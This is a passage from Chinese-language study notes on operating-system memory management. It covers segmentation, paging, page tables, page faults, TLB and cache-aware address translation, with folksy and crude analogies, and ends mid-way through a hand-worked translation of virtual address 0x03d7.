<p>那么实际上段表项只有段长和基址两个信息,而这些我们都想到了,我们甚至想到了保护措施</p>
<p><strong>在纯分段的系统上,段表被放在哪里呢?</strong></p>
<p>操作系统是常驻内存的,进程控制块PCB由操作系统维护,每个进程又只有一个段表,</p>
<p>那么很自然的就会想到,段表放在进程PCB中,由操作系统维护</p>
<p>果真如此吗?</p>
<p>非也,诚如是则PCB过于臃肿,操作系统占用的内存空间会因为段表变的非常大</p>
<p>实际上PCB只需要维护一个指向段表内存地址的指针和段表的长度</p>
<p>在进程被调度运行时,段表地址和段表长度会被放到硬件段表寄存器中</p>
<h3 id="地址翻译">地址翻译</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220611092650927.png"
alt="image-20220611092650927" />
<figcaption aria-hidden="true">image-20220611092650927</figcaption>
</figure>
<p>加入纯分段系统上,给出一个32位的内存地址,</p>
<p>高16位为段号,低16位为段内偏移</p>
<p>高位地址为<code>0x0002h</code>,即段号,首先要和段表长度进行比较,如果段号大于等于段表长度则产生越界中断</p>
<p>如果段号小于段表长度,那么用段表地址+段号相当于一个基址变址寻址,去查2号段即段表里面从上往下数第三条记录,发现基址为<code>40K</code>,段长6K</p>
<p>低16位为<code>0x0100h=0.25K&lt;6K</code>因此该段内偏移量是合法的,不会发生越界中断</p>
<p>最终基址+段内偏移=<code>1010 0000 0000 0000+1 0000 0000=1010 0001 0000 0000=0xA100</code>即物理地址</p>
<h3 id="地址空间维度">地址空间维度</h3>
<p>纯分页系统中用户进程地址空间是一维的,直接给出一个物理地址就可以寻址</p>
<p>纯分段系统中用户进程地址空间是二维的,需要通过<code>段:段内偏移</code>指定一个物理地址</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612080803151.png"
alt="image-20220612080803151" />
<figcaption aria-hidden="true">image-20220612080803151</figcaption>
</figure>
<p>每个段内都是从0开始开始编址</p>
<h3 id="分段的好处">分段的好处</h3>
<p>1.方便共享</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612081026860.png"
alt="image-20220612081026860" />
<figcaption aria-hidden="true">image-20220612081026860</figcaption>
</figure>
<p>代码和只读数据可以在物理内存中只有一个段,但被多个进程的段表项目指向</p>
<p>实际上后来的段页式中,共享库就是这样用的</p>
<h3 id="碎片">碎片</h3>
<p>外部碎片:</p>
<p>画个图立刻清楚</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612083115693.png"
alt="image-20220612083115693" />
<figcaption aria-hidden="true">image-20220612083115693</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612083039864.png"
alt="image-20220612083039864" />
<figcaption aria-hidden="true">image-20220612083039864</figcaption>
</figure>
<p>内部碎片:</p>
<p>在内存分段系统上没有内部碎片问题</p>
<p>在分页系统上,假设一个页是4KB,一个进程的地址空间要33KB,那么前32K正好8页,第九页上只用了1KB,剩下这3KB就是内部碎片</p>
<h2 id="段页式">段页式</h2>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612083740271.png"
alt="image-20220612083740271" />
<figcaption aria-hidden="true">image-20220612083740271</figcaption>
</figure>
<p>段页式结构,对用户来说,可以感受到的是分段,实际使用的时候和纯分段几乎相同</p>
<p>操作系统负责分页工作,对用户不可见</p>
<p>一个段可能由多个页组成,比如一个8K的段就有可能由两个4k的页组成,这个段就管理两个页</p>
<p>一个进程对应一个段表,每个段维护一个表,因此一个有多个段的进程对应多个页表</p>
<p>纯分段结构中,段表存放的是段基址和段长度,而段页式结构中,段表中存放的是页表长度,页表存放块号,页表存放的是内存块号</p>
<h2 id="从物理寻址到虚拟寻址">从物理寻址到虚拟寻址</h2>
<p>虚拟内存是一伙子异想天开的人造出来的巧夺天工,在虚拟内存之前,是符合普通人认知的物理内存</p>
<p>计算机主存(目前可以直接认为成内存条)可以看成是一个巨大的数组,他有M个连续的单元,每个单元大小是一个字节,各个单元线性分布</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516182449307.png"
alt="image-20220516182449307" />
<figcaption aria-hidden="true">image-20220516182449307</figcaption>
</figure>
<p>物理寻址就是直接在内存条上寻址,CPU想要读写哪个单元的内容,只需要指定该单元的编号,或者说下标</p>
<blockquote>
<p>物理寻址的一个相对完整的过程:</p>
<p>1.CPU指定物理地址,将该地址信息送到地址总线</p>
<p>2.CPU指定对该地址是读还是写操作,将该控制信息发往控制总线</p>
<p>3.CPU从数据总线上对相应内存单元进行读写操作</p>
</blockquote>
<p>既然物理寻址方法如此自然易懂,为什么还要引入一个相对晦涩的虚拟寻址呢?</p>
<p>其中的一个原因是,内存条太小了,想要把一些磁盘空间也乔装打扮一下当成内存使用</p>
<p>还有更高级的原因,比如更方便地管理内存</p>
<p>虚拟空间是对上层而言的概念,而物理空间是对下层而言的,</p>
<p>用户感到的是虚拟空间,有限的内存上似乎可以运行无限多的进程,开无限多的进程独立地址空间,</p>
<p>而对操作系统来说,实际上的"资源"就只有内存条那固定死的地址空间.</p>
<p>操作系统通过及时地将用户暂时不用的进程的物理空间换给其他进程的虚拟空间使用,让用户产生错觉认为内存很大.</p>
<p>当用户又要继续使用刚才暂时不用的进程时,此时该进程占用的"资源"刚才被操作系统从内存中搬到磁盘中,然后交给了别的进程.</p>
<p>因此操作系统又会启动缺页处理,把磁盘中该进程的信息重新搬回来放到内存中使用.</p>
<p>这就好比用工荒,又好比小学时做过的一道数学题</p>
<blockquote>
<p>400个士兵守一个方形的城池,每时每刻都有士兵阵亡.</p>
<p>如何保证敌人每时每刻看到每面墙上都有至少100个士兵在防守的假象?</p>
<p>400个士兵均分4组站在4个角楼上就可以造成每面城墙有200名士兵的假象</p>
<p>东北角的士兵就同时起到忽悠东面和北面两个方向敌人的作用</p>
<p>在虚拟内存概念中,主存就起到了这个东北角士兵的作用</p>
</blockquote>
<p>虚拟寻址相对于物理寻址多了一个硬件MMU(内存管理单元)和一个步骤即地址翻译.</p>
<p>并且CPU指定的虚拟地址有可能并不放在主存中,而是放在磁盘中,这就发生了缺页,操作系统会一系列操作给他整的不缺喽然后继续执行,这都是后话了</p>
<p>最简化的虚拟寻址模型:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516182852208.png"
alt="image-20220516182852208" />
<figcaption aria-hidden="true">image-20220516182852208</figcaption>
</figure>
<blockquote>
<p>一个相对完整的虚拟寻址过程:</p>
<p>1.CPU指定一个虚拟地址,发往MMU内存管理单元(MMU也是CPU中集成的一部分)</p>
<p>2.MMU将虚拟地址翻译成物理地址,送往地址总线(由于MMU是CPU的一部分,因此还是CPU将该物理地址送往地址总线)</p>
<p>3.CPU指定对该物理地址的读或者写操作,将控制信息送往控制总线</p>
<p>4.CPU通过数据总线对该内存单元进行读或者写操作</p>
</blockquote>
<h2 id="地址空间">地址空间</h2>
<h3 id="物理地址空间和虚拟地址空间">物理地址空间和虚拟地址空间</h3>
<p>一个512MB的内存条上的地址空间即物理地址空间是多大?</p>
<p>一个单元一个字节,<span
class="math inline">\(512MB=512*2^{10}KB=512*2^{20}B=2^{29}B\)</span>即物理地址空间编号范围为:<span
class="math inline">\([0,2^{29})\)</span></p>
<p>物理地址空间就是内存条上的地址空间数</p>
<p>虚拟地址空间是指想要给用户造成的假象中,让用户感觉出来的内存大小,实际上是磁盘上的一个连续巨大数组</p>
<blockquote>
<p>还是以士兵守城举例,一共400个活人,每面墙上分100个士兵,不可能再多了,这就是物理地址空间</p>
<p>但是士兵都站在角楼可以造成每面墙都有200个士兵的假象,这就是虚拟空间</p>
</blockquote>
<p>通常虚拟地址空间会比物理空间大,否则虚拟空间没有存在的意义</p>
<blockquote>
<p>绷不住了</p>
<p><img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516204149979.png" /></p>
</blockquote>
<p>为什么不直接把物理空间做大?物理空间即内存条,相对磁盘贵得多.如果有钱自然可以整一个不用磁盘,只用内存(还涉及到断点是否能保存的问题)的计算机,现在对于私人电脑而言,比如联想拯救者y9000p2021h,显然不现实</p>
<h3 id="数据对象和地址空间的关系">数据对象和地址空间的关系</h3>
<p>数据对象就是存放在地址空间上的数据,其在地址空间中的位置或者说下标就是其属性</p>
<p>比如一个char一个字节,存放在一个内存单元中,</p>
<p>一个int四个i直接,存放在四个连续的内存单元中,</p>
<p>每个数据对象都会有一个虚拟地址空间地址,当其所在进程被实际运行时,它有可能在物理空间中有一个物理空间地址</p>
<h2 id="虚拟内存作为缓存工具">虚拟内存作为缓存工具</h2>
<h3 id="分页">分页</h3>
<p>虚拟空间比物理空间大,自然不能一股脑塞进物理空间里.</p>
<p>应该是用到虚拟空间的某一块就从虚拟空间中把这一块搬到物理空间中</p>
<blockquote>
<p>这就好比一个有5个坑的厕所但是有20个人要扔炸弹,自然要挑最急或者最先排队的5个人去扔炸弹,20个人一起扔炸弹有很大可能把炸弹扔别人身上或者扔外边</p>
</blockquote>
<p>这里选5个人一组去扔炸弹就好比从虚拟空间中选出一部分块放到物理内存中接收CPU的访问</p>
<blockquote>
<p>为什么CPU不能直接去磁盘访问?</p>
<p>这从量上举例</p>
<p>就好比中国有13亿人口就要挖13个上厕所的坑,</p>
<p>其一正常人不是每时每刻都在扔炸弹,就好比磁盘中的数据不是每时每刻都要被CPU访问</p>
<p>其二建13亿个厕所走到路上得随处可见的坑(我密恐犯了),类比计算机中就需要从CPU到磁盘之间部署总线,磁盘一般比较大,比如1个T,那么地址总线宽度就得<span
class="math inline">\(log_2 1T\)</span></p>
<p>从质上举例子,内存速度远快于磁盘,</p>
<p>CPU去访问内存,然后内存去访问磁盘,就好比师长向团长下达命令,团长去团里下命令,要找士兵许三多,</p>
<p>但是CPU去访问磁盘就好比师长直接向师广大士兵下达命令,找许三多这个人.</p>
</blockquote>
<p>规范的术语:</p>
<p>虚拟内存(Virtual memory,VM)</p>
<p>物理内存分割成的块叫做物理页(Physical Page,PP)</p>
<p>虚拟内存分割成的块叫做虚拟页(Virtual Page,VP)</p>
<p>虚拟内存分割成块是因为物理内存放不下,那为什么物理内存也要分块?</p>
<blockquote>
<p>这就好比20个人去一个10个坑厕所扔炸弹,20个人里有10男10女,扔炸弹这种事做不到男女搭配干活不累,需要5个坑放在男厕所,5个坑放在女厕所,然后10男分两组去男厕扔炸弹,女同理</p>
<p>都是人但是因为性别就得分开扔炸弹</p>
<p>有些连续虚拟内存块就得分开了放到物理内存里</p>
</blockquote>
<p>虚拟内存中的一个虚拟页在被使用的时候要搬到物理内存中,复制到一个物理页上,</p>
<p>用不到的虚拟页其对应的物理页有可能就被让给其他虚拟页使用</p>
<p>可以说某一时刻一个正在被使用的物理页是一个虚拟页的快照,</p>
<p>当然物理页可以修改,这会导致物理页和其对应的虚拟页内容有差异,这种情况下应该怎么办呢?当该物理页将要被让给其他虚拟页时需要将改动写回其对应的虚拟页</p>
<h3 id="页属性">页属性</h3>
<p>页属性:物理页和虚拟页有相同的大小<span
class="math inline">\(P=2^p\)</span>字节</p>
<p>由于物理地址空间比虚拟地址空间小,因此显然物理页数量比虚拟页数量少</p>
<p>根据虚拟页是否被使用以及是否正在被使用,虚拟页可以分成三种</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516193505725.png"
alt="image-20220516193505725" />
<figcaption aria-hidden="true">image-20220516193505725</figcaption>
</figure>
<p>分配与否就是指该虚拟页是否存储了信息</p>
<p>缓存与否就是该虚拟页是否被复制到物理页供CPU访问</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516193749579.png"
alt="image-20220516193749579" />
<figcaption aria-hidden="true">image-20220516193749579</figcaption>
</figure>
<blockquote>
<p>什么是缓存?</p>
<p>看电影的时候也会遇到"缓存"这个概念,缓存有点一劳永逸的概念,第一次加载需要花费一些时间,但是以后对相同内容的重复访问就快得多了</p>
<p>什么叫"缓存在DRAM中",就是指虚拟页已经拷贝到内存上建立了物理页,方便CPU直接访问内存而不用与磁盘打交道</p>
<p>因此内存条在存储系统中可以看成是CPU和磁盘之间的缓存器,就好比cache是CPU和磁盘之间的缓存器,只不过内存比cache大得多慢得多</p>
</blockquote>
<p>显然VP数量多与PP,VP的二进制地址编号更长</p>
<h3 id="幼年的页表">幼年的页表</h3>
<p>CPU或者说虚拟内存系统怎么知道它想要访问的虚拟页是否已经被拷贝到内存条上成为物理页了呢?</p>
<blockquote>
<p>这就好比班主任要约谈某个倒霉蛋,但是班主任怎么知道这个倒霉蛋有没有来学校呢?班主任会先看一下签到表判断一下倒霉蛋来没来,来了则直接约谈,没来则先从家里叫到学校然后再约谈</p>
</blockquote>
<p>让虚拟内存系统掌握目前有哪些虚拟页拷贝成了物理页,要在==主存上==放一个页表(Page
Table,PT)</p>
<blockquote>
<p>为什么要放到主存上?</p>
<p>还能放到哪里呢?CPU的寄存器里?磁盘里?</p>
<p>寄存器稀松了了的几个,每一个最多存放一个64位数4字节,而一个页表表项数成千上万,每个表项都是以字节为单位.显然CPU寄存器放不开?</p>
<p>放磁盘里那和CPU直接访问磁盘上的数据有啥区别?</p>
<p>也只能放在内存里了</p>
</blockquote>
<p>页表项(PTE)数是根据虚拟内存确定的,虚拟页有几个,就有多少个页表项</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516194906654.png"
alt="image-20220516194906654" />
<figcaption aria-hidden="true">image-20220516194906654</figcaption>
</figure>
<p>页表项按照顺序表方式排列,下标从0到<code>虚拟页数-1</code>,与虚拟页一一对应</p>
<p>有效位表明该虚拟页是否已经在物理内存中创建了物理页,</p>
<p>页表项剩下的部分是物理页号,光知道一个虚拟页创建了一个物理页还不够,还得知道这个物理页在哪里</p>
<blockquote>
<p>这就好比20个爷们去只有5个坑的男厕扔炸弹,厕所所长为了方便惩罚扔不准炸弹的爷们,给五个坑标上0,1,2,3,4,然后让每个人扔炸弹的时候报告自己对哪个坑输出,</p>
<p>然后厕所所长记录一张如厕表,<code>坑[0]=老八,坑[1]=张三...</code>就能根据坑号责任到人,</p>
<p>如果1号坑的爷们占着坑不扔炸弹,所长就则给外面的人说1号坑闲置,来个爷们把上一个爷们给挤掉</p>
<p>如果1号坑的爷们快速地扔完炸弹走了,所长就把1号坑标记为闲置状态</p>
</blockquote>
<p>之所以说"幼年的页表",是因为实际上的页表项目还要记录很多信息,这里只是最简化的页表</p>
<h3 id="页命中">页命中</h3>
<p>CPU想要访问某个虚拟地址,但是这个虚拟地址对应的页是否已经被缓存到内存中了呢?</p>
<p>如果是则"命中"</p>
<blockquote>
<p>这就好比20个爷们去一个5坑男厕,一个找茬想让老八表演绝活,但是绝活只能靠在厕所中食用炸弹完成,于是找茬的去问所长,老八是否正在坑上,</p>
<p>所长也挺好奇的,查了一下如厕表,发现<code>坑[0]=老八</code>,老八确实正在扔炸弹,这就命中了</p>
<p>否则所长就要让外面的老八挤掉一个站着茅坑不扔炸弹的张三然后表演绝活</p>
</blockquote>
<p>在计算机上怎么判定是不是呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516200840582.png"
alt="image-20220516200840582" />
<figcaption aria-hidden="true">image-20220516200840582</figcaption>
</figure>
<p>根据CPU给出的虚拟地址首先查虚拟页表,先看有效位,如果为1则命中,根据页表项后面的物理页号去物理内存中去访问物理页</p>
<p>如果有效位为0则表明该虚拟地址对应的页还没有拷贝到物理内存里,触发缺页异常,这都是后话了</p>
<blockquote>
<p>虚拟地址和虚拟页的关系?</p>
<p>虚拟页是一个虚拟单元集合,一个虚拟页集合了一些连续的虚拟单元,每个虚拟单元都有一个虚拟地址</p>
<p>虚拟页的地址就是第一个虚拟单元的虚拟地址</p>
<p>因此给定一个虚拟地址查页表的时候应该是查询该虚拟地址是否属于某个虚拟页的<strong>辖区</strong></p>
</blockquote>
<h3 id="缺页">缺页</h3>
<p>没有命中的情况就是缺页</p>
<p><strong>什么情况下判定为缺页?</strong></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516201903715.png"
alt="image-20220516201903715" />
<figcaption aria-hidden="true">image-20220516201903715</figcaption>
</figure>
<p>cpu指定的虚拟地址查页表后发现有效位为0,立刻引发缺页中断</p>
<p><strong>缺页了怎么整才能让它不缺?</strong></p>
<p>我原来认为缺页了CPU就直接越俎代庖地去访问磁盘了,这经过前文的学习显然是想当然</p>
<p>缺页之后选择一个"不是很重要"的物理页(比如PP3)给他扬了,修改指向该物理页PP3的页表项PTE4,有效位置0,</p>
<blockquote>
<p>此举的目的是当先前的虚拟页VP4再次使用时,需要重新拷贝到物理页.如果此时不即使修改PTE4的有效位则再次使用VP4时一查表,发现已经缓存好了,直接访问PP3了,可是PP3实际上是VP3的拷贝</p>
</blockquote>
<blockquote>
<p>这里"选择一个不是很重要的物理页"涉及到页面调度算法,这是另一本黑叔叔,&lt;<现代操作系统>&gt;中的内容</p>
</blockquote>
<p>然后用需要用到的虚拟页VP3拷贝到该物理页PP3位置,挤掉VP4,</p>
<p>修改对应的页表项PP4,有效位
置1然后物理页表地址写上刚才拷贝到的物理页的地址PP3</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516202424662.png"
alt="image-20220516202424662" />
<figcaption aria-hidden="true">image-20220516202424662</figcaption>
</figure>
<p>都改完之后,重新执行刚才的指令,此时虚拟地址就已经被缓存了,不会再发生缺页了</p>
<p>一些规范术语:</p>
<p>交换或者页面调度:再内存和磁盘之间传送页</p>
<p>页面调入或者磁盘换入,页从磁盘传送到内存,方向都是相对于内存而言的,</p>
<blockquote>
<p>方向总是相对于更靠近CPU的器件而言的</p>
</blockquote>
<p>按需页面调度:只有不得不进行页面调度即发生了缺页时,才进行页面调度的调度方式</p>
<blockquote>
<p>现代操作系统一般使用按需页面调度</p>
</blockquote>
<h2 id="虚拟内存作为内存管理工具">虚拟内存作为内存管理工具</h2>
<p>每个进程都有自己独立的==虚拟==地址空间,注意不是物理地址空间</p>
<p>这就要求每个进程都有独立的页表</p>
<p>物理空间只有一个,就是内存条,或者说主存</p>
<p>进程的虚拟地址空间看似是连续地开了一大片,实际上有可能在物理内存上东一块西一块.</p>
<p>不同的进程可以有共享的物理页,这时动态库的物质基础</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516205620915.png"
alt="image-20220516205620915" />
<figcaption aria-hidden="true">image-20220516205620915</figcaption>
</figure>
<blockquote>
<p>这里有一个问题,如果两个进程的代码段都是从虚拟地址的<code>0x400000</code>开始,岂不是对应了磁盘上的同一虚拟页?</p>
<p>==可以提出一种猜想==</p>
<p>进程的虚拟地址空间是要小于磁盘上全部的虚拟地址空间的</p>
<p>进程的虚拟地址并不是磁盘上的虚拟地址空间的下标,</p>
<p>而是相对于磁盘上几个连续的页面组成的一个子虚拟地址空间而言的</p>
<p>该子虚拟空间从0开始重新编号</p>
</blockquote>
<h2 id="虚拟内存作为内存保护工具">虚拟内存作为内存保护工具</h2>
<p>啥是内存保护?</p>
<p>比如用户不允许修改内核的数据</p>
<p>只读数据无法被修改,代码段也不许被修改</p>
<p>不允许修改其他内存的虚拟地址空间</p>
<blockquote>
<p>进程的虚拟地址空间独立,很自然的就保证了进程不允许修改其他内存的虚拟地址空间,</p>
<p>这就好比让两个在水上步行球中的人打架,两个球距离最近也就是相切,不会相互嵌入</p>
<p>这个球就好比进程独立的虚拟地址空间</p>
</blockquote>
<p>...</p>
<p>幼年的页表成熟了一些,成了带许可位的页表</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516210523521.png"
alt="image-20220516210523521" />
<figcaption aria-hidden="true">image-20220516210523521</figcaption>
</figure>
<p>在页表项中加上许可位,就可以限制进程对该页读写访问,</p>
<p>sup许可位限制普通用户和管理员的区别</p>
<p>违反这些许可条件的指令将会导致段错误</p>
<h2 id="地址翻译-1">地址翻译</h2>
<p>符号约定</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516225933019.png"
alt="image-20220516225933019" />
<figcaption aria-hidden="true">image-20220516225933019</figcaption>
</figure>
<p>地址翻译就是从虚拟地址计算出物理地址的过程</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516214911937.png"
alt="image-20220516214911937" />
<figcaption aria-hidden="true">image-20220516214911937</figcaption>
</figure>
<blockquote>
<p>咱就是说这个MAP函数这么抽象有必要这样写一下吗</p>
</blockquote>
<p>这个映射是在MMU中完成的</p>
<h3 id="最简单的地址翻译">最简单的地址翻译</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516220103992.png"
alt="image-20220516220103992" />
<figcaption aria-hidden="true">image-20220516220103992</figcaption>
</figure>
<p>每个进程可以有自己的独立页表,需要一个页表基址寄存器指向页表基地址,作用类似于段寄存器</p>
<blockquote>
<p>一个精确到存储单元的虚拟地址分成虚拟页号和虚拟页偏移量两部分</p>
<p>确定到页用到页号,确定到页上的一个单元需要页偏移量</p>
<p>由于物理页大小和虚拟页大小相同,因此物理页偏移量和虚拟页偏移量是相同的</p>
<p>虚拟页数量一般会大于物理页数量,因此虚拟页号长度一般长于物理页号,即<span
class="math inline">\(n&gt;m\)</span></p>
</blockquote>
<p>翻译过程:</p>
<p>1.CPU指定一个虚拟地址给MMU</p>
<p>2.MMU将该虚拟地址的<span
class="math inline">\([p,n-1]\)</span>位作为虚拟页号去查页表,剩下<span
class="math inline">\([0,p-1]\)</span>位作为页偏移量</p>
<p>3.虚拟页号查页表对应项,如果有效位是0则缺页中断,否则命中,如果命中则:</p>
<p>4.从页表中读取物理页号<span
class="math inline">\([p,m-1]\)</span>,和页偏移量<span
class="math inline">\([0,p-1]\)</span>拼成物理地址</p>
<p>5.CPU将该物理地址放到地址总线上,准备访问内存</p>
<h3 id="考虑高速缓存的地址翻译">考虑高速缓存的地址翻译</h3>
<p>原来的地址翻译,CPU直接访问内存,现在在CPU和内存之间再加一级缓存,L1高速缓存</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516221624510.png"
alt="image-20220516221624510" />
<figcaption aria-hidden="true">image-20220516221624510</figcaption>
</figure>
<p>处理器只能发出虚拟地址,MMU翻译成物理地址,处理器不能直接发出物理地址</p>
<p>页表还是存放在内存中,高速缓存存放的是很少一部分的<strong>页表项目</strong>还有<strong>数据</strong></p>
<p>1.处理器发出虚拟地址VA之后进入MMU进行翻译,得到一个虚拟页号</p>
<p>2.如果没有L1则下一步要根据虚拟页号,到内存中访问页表了,而现在有L1,要先检查L1中有没有该虚拟页号对应的页表条目.</p>
<p>3.如果L1命中,并且对应页表条目有效位为1,则不再访问内存,直接从L1中取出该页表条目的<strong>物理页号</strong>给MMU.</p>
<p>4.如果L1不命中,则还需访问内存,从真正的页表中找到该虚拟页号对应的页表条目,然后根据有效位判断是否缺页,</p>
<p>如果内存也命中即有效位为1则不缺页,将该<strong>页表条目</strong>返回L1,从L1中挤出一条相对不重要的记录.</p>
<p>然后MMU再访问L1获得页表条目的物理页号,(这次L1必然命中),然后拼成物理地址</p>
<p>如果发生缺页,也是内存和磁盘之间页的传递,与L1没有关系,无需讨论</p>
<p><strong>然后CPU访问物理地址也因L1有所变化</strong></p>
<p>在没有L1时,MMU拿到物理地址之后会加到地址总线上,但是现在MMU拿到物理地址后还是会先查L1,如果L1命中,则直接取出数据通过内部总线传递给CPU,免去了访问内存和外总线的过程</p>
<p>当L1不命中时才会查内存上的物理地址,然后取出其上的地址,然后在L1中挤掉一个相对不重要的记录,存入该物理地址及其数据的键值对</p>
<h3 id="tlb加速翻译的地址翻译">TLB加速翻译的地址翻译</h3>
<p>TLB:翻译后备缓冲器(Translation Lookaside Buffer)</p>
<p>这个玩意儿是加速翻译的,啥意思呢.</p>
<blockquote>
<p>如果五秒前我问了别人,"你好"用英语怎么说并获得了回答,</p>
<p>五秒后我要对一个米国人打招呼,这时需要翻译</p>
<p>但凡比鱼聪明点的人都还记得"你好"用英语怎么说,这就是TLB命中</p>
<p>但是如果五秒前我尝试寄了十个甚至更多的英语单词,其中即使包括"你好",五秒后我也不一定能想起来,这就是后来的翻译挤掉了前面翻译的缓存,然后TLB不命中</p>
<p>此时想不起来就应该再问懂哥儿,"你好"用英语怎么说,然后记住,方便奉承下一个米国人用,这就是TLB不命中之后干的事</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516224400351.png"
alt="image-20220516224400351" />
<figcaption aria-hidden="true">image-20220516224400351</figcaption>
</figure>
<p>处理器指定一个虚拟地址交给MMU,MMU首先不会尝试查L1或者内存中的页表进行翻译,而是首先访问TLB,看看刚才是不是已经翻译过并且还记得,如果命中则直接用刚才记住的翻译得到物理地址</p>
<p>如果TLB没有命中则老老实实去查高速缓存页表项,要是再不命中则老老实实去查内存页表,要是还不命中则缺页</p>
<p>可气的是,总有一伙子人能设计地这些缓冲几乎百发百中</p>
<h3 id="手工模拟地址翻译">手工模拟地址翻译</h3>
<h4 id="题目环境">题目环境</h4>
<p>考虑上TLB,L1缓存,手工模拟一个地址翻译过程</p>
<p>系统参数:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516232636330.png"
alt="image-20220516232636330" />
<figcaption aria-hidden="true">image-20220516232636330</figcaption>
</figure>
<p>这里几路相联,几个组实际上就是将线性的缓存器改成了阵列,按照行列存储</p>
<blockquote>
<p>每个页面大小<span
class="math inline">\(64Bytes=2^6Bytes\)</span>,一个内存单元<span
class="math inline">\(1Bytes\)</span>,因此一个页管理<span
class="math inline">\(2^6\)</span>个地址,页内偏移量就得是一个6位二进制数,剩下的高位才是页号</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516232919987.png"
alt="image-20220516232919987" />
<figcaption aria-hidden="true">image-20220516232919987</figcaption>
</figure>
</blockquote>
<blockquote>
<p>TLB中缓存的是刚才查过的翻译,可以认为是<code>[VPN,PPN]</code>键值对,MMU给出一个VPN,如果TLB中有键为该VPN的键值对,则TLB给出PPN值,此时TLB命中,</p>
<p>否则TLB不命中则需要查L1或者内存页表进行地址翻译</p>
<p>这里给出了一个假定的TLB缓存情况</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516233348777.png"
alt="image-20220516233348777" />
<figcaption aria-hidden="true">image-20220516233348777</figcaption>
</figure>
</blockquote>
<blockquote>
<p>页表是单级结构,这里给出了假定的页表的情况</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516233340796.png"
alt="image-20220516233340796" />
<figcaption aria-hidden="true">image-20220516233340796</figcaption>
</figure>
</blockquote>
<blockquote>
<p>高速缓存L1通过物理地址字段进行寻址,这里给出了假定的缓存情况</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516233523416.png"
alt="image-20220516233523416" />
<figcaption aria-hidden="true">image-20220516233523416</figcaption>
</figure>
</blockquote>
<h4
id="将虚拟地址0x03d7翻译成物理地址">将虚拟地址<code>0x03d7</code>翻译成物理地址</h4>
<h5 id="xa虚拟地址格式">0xA虚拟地址格式</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516235021410.png"
alt="image-20220516235021410" />
<figcaption aria-hidden="true">image-20220516235021410</figcaption>
</figure>
<h5 id="xb地址翻译">0xB地址翻译</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516235143678.png"
alt="image-20220516235143678" />
<figcaption aria-hidden="true">image-20220516235143678</figcaption>
</figure>
<p>TLB命中,物理页号<code>0x0D</code>拼接页偏移得到物理地址</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516235504854.png"
alt="image-20220516235504854" />
<figcaption aria-hidden="true">image-20220516235504854</figcaption>
</figure>
<p>只要是TLB中能找到的记录,都不会缺页,这是因为,最近的记忆会挤掉老的记忆,TLB中只要能找到,说明最近被翻译过</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>值</th>
</tr>
</thead>
<tbody>
<tr>
<td>VPN</td>
<td><code>0xf</code></td>
</tr>
<tr>
<td>TLB索引(TLBi)</td>
<td><code>0x3</code></td>
</tr>
<tr>
<td>TLB标记(TLBt)</td>
<td><code>0x3</code></td>
</tr>
<tr>
<td>TLB命中?</td>
<td>是</td>
</tr>
<tr>
<td>缺页</td>
<td>否</td>
</tr>
<tr>
<td>PPN</td>
<td><code>0xd</code></td>
</tr>
</tbody>
</table>
<h5 id="xc物理地址格式">0xC物理地址格式</h5>
<table>
<colgroup>
<col style="width: 8%" />
<col style="width: 8%" />
<col style="width: 8%" />
<col style="width: 8%" />
<col style="width: 8%" />
<col style="width: 8%" />
<col style="width: 8%" />
<col style="width: 8%" />
<col style="width: 8%" />
<col style="width: 8%" />
<col style="width: 8%" />
<col style="width: 8%" />
</colgroup>
<thead>
<tr>
<th>0</th>
<th>0</th>
<th>1</th>
<th>1</th>
<th>0</th>
<th>1</th>
<th>0</th>
<th>1</th>
<th>0</th>
<th>1</th>
<th>1</th>
<th>1</th>
</tr>
</thead>
<tbody>
</tbody>
</table>
<h5 id="xd物理内存引用">0xD物理内存引用</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517000150935.png"
alt="image-20220517000150935" />
<figcaption aria-hidden="true">image-20220517000150935</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517000501697.png"
alt="image-20220517000501697" />
<figcaption aria-hidden="true">image-20220517000501697</figcaption>
</figure>
<p>缓存命中</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>值</th>
